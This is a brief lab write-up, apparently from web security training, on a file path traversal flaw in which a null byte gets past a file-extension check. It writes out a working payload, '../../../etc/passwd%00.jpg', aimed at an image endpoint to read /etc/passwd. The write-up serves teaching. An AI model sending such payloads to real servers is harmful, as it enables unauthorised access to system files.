# Lab 6: 
File path traversal, validation of file extension with null byte bypass

This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

**Details:**

An application may require the user-supplied filename to end with an expected file extension, such as .png. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: filename=../../../etc/passwd%00.png

**Analysis:** 
Vulnerable path - /image?filename=55.jpg

**Payload:**

```php
/image?filename=../../../etc/passwd%00.jpg
```


